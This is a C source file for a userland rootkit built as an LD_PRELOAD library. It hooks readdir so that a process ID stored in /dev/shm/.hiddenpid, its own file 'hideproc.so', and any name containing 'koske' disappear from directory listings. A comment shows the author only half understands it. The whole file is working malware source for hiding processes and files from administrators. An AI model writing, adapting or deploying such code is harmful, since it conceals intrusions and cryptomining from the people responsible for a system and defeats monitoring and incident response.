#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>

static char hidden_pid[32] = {0};
static struct dirent *(*real_readdir)(DIR *) = NULL;
static const char *hidden_file = "hideproc.so";
static const char *forbidden_keyword = "koske";

//Comment: Still do not quite understand the code and concept but gonna just leave it here for now

void load_hidden_pid(void) {
    FILE *fp = fopen("/dev/shm/.hiddenpid", "r");
    if (fp) {
        if (fgets(hidden_pid, sizeof(hidden_pid), fp) != NULL) {
            hidden_pid[strcspn(hidden_pid, "\n")] = '\0';
        }
        fclose(fp);
    }
}

__attribute__((constructor))
void init(void) {
    real_readdir = (struct dirent *(*)(DIR *)) dlsym(RTLD_NEXT, "readdir");
    load_hidden_pid();
}

struct dirent *readdir(DIR *dirp) {
    struct dirent *entry;

    if (!real_readdir) {
        real_readdir = (struct dirent *(*)(DIR *)) dlsym(RTLD_NEXT, "readdir");
    }

    while ((entry = real_readdir(dirp)) != NULL) {
        // 1. Filter by PID
        if (hidden_pid[0] != '\0' && strcmp(entry->d_name, hidden_pid) == 0) {
            continue;  // skip this entry
        }

        // 2. Filter by Specific Filename
        if (strcmp(entry->d_name, hidden_file) == 0) {
            continue; 
        }

        // 3. Filter by Keyword 
        if (strstr(entry->d_name, forbidden_keyword) != NULL) {
            continue; 
        }
        return entry;
    }

    return NULL;
}
